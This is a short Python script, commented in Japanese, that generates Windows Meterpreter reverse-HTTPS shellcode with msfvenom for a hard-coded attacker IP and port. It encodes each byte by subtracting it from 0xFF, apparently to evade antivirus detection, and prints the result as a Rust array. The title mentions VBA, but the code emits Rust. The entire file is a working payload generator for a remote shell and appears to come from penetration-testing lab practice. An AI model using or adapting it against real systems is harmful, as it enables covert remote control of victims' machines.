# VBAでmsfvenomのシェルコードを実行させるペイロードを生成する

import subprocess
atk_ip = "192.168.45.153"
atk_port = "443"
target = "64" 

# レスポンスを受け取りたい

if(target == "32"):
    raw = subprocess.check_output(["msfvenom -p windows/meterpreter/reverse_https LHOST=" + atk_ip +" LPORT="+atk_port+" EXITFUNC=thread -f rust | tr -d '\r\n_'"],shell=True)
elif(target == "64"):
    raw = subprocess.check_output(["msfvenom -p windows/x64/meterpreter/reverse_https LHOST=" + atk_ip +" LPORT="+atk_port+" EXITFUNC=thread -f rust | tr -d '\r\n_'"],shell=True)


str_raw = str(raw)
header = "let mut " + str_raw.split("=")[0][6:] + "="
shellcode = str_raw.split("=")[1][str_raw.split("=")[1].find("[")+1 : str_raw.split("=")[1].find("]")].split(",")
new_bytes_list = [hex(0xFF - int(byte, 16)) for byte in shellcode]


print(header + "[" + ",".join(new_bytes_list) + "];")

